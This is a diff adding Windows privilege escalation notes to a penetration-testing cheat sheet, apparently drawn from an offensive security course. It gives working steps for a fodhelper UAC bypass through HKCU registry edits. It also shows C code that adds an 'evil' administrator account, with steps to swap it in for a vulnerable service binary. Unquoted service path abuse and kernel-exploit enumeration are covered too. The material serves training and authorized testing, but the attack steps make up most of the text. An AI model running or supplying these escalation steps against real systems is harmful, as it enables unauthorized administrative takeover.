@@ -456,6 +456,93 @@ Change user password on windows:
 C:\Windows\system32> net user admin my_new_password
 ```
 
+example
+
+```
+C:\> cd C:\Tools\privilege_escalation\SysinternalsSuite
+C:\Tools\privilege_escalation\SysinternalsSuite> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
+```
+
+procmon.exe, check where the binary is editing registry
+
+"Result" filter for "NAME NOT FOUND",
+
+&#x20;HKEY\_CURRENT\_USER (_HKCU_) hive, which we, the current user, have read and write access to
+
+![](<.gitbook/assets/image (1).png>)
+
+We will use REG ADD with the /v argument to specify the value name and /t to specify the type:
+
+```
+C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
+C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
+```
+
+### Insecure file permission (windows)
+
+We can run icacls, passing the full service name as an argument. The command output will enumerate the associated permissions:
+
+```
+C:\Users\student> icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
+```
+
+```c
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user evil Ev!lpass /add");
+  i = system ("net localgroup administrators evil /add");
+  
+  return 0;
+}
+```
+
+Next, we'll cross-compile[7](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/privilege-escalation/windows-privilege-escalation-examples/insecure-file-permissions-serviio-case-study#fn7) the code on our Kali machine with i686-w64-mingw32-gcc, using -o to specify the name of the compiled executable:
+
+```
+kali@kali:~$i686-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+
+```
+C:\Users\student> move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"
+C:\Users\student> move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe
+C:\Users\student> dir "C:\Program Files\Serviio\bin\"
+C:\Users\student> net stop Serviio
+C:\Users\student>wmic service where caption="Serviio" get name, caption, state, startmode
+C:\Users\student>whoami /priv
+C:\Users\student\Desktop> shutdown /r /t 0 
+C:\Users\evil> net localgroup Administrators
+```
+
+### Leveraging Unquoted Service Paths
+
+C:\Program Files\My Program\My Service\service.exe
+
+```
+C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+C:\Program Files\My Program\My service\service.exe
+```
+
+#### Windows Kernel Vulnerabilities: USBPcap Case Study
+
+```
+# version and architecture of the target operating system
+C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+# enumerate the drivers that are installed on the system
+C:\Users\student\Desktop>driverquery /v
+kali@kali:~# searchsploit USBPcap
+C:\Program Files\USBPcap> type USBPcap.inf
+
+C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1> mingw-w64.bat
+C:\> gcc --help
+gcc exploit.c -o exploit.exe
+```
+
 ### SUID
 
 #### Find suid
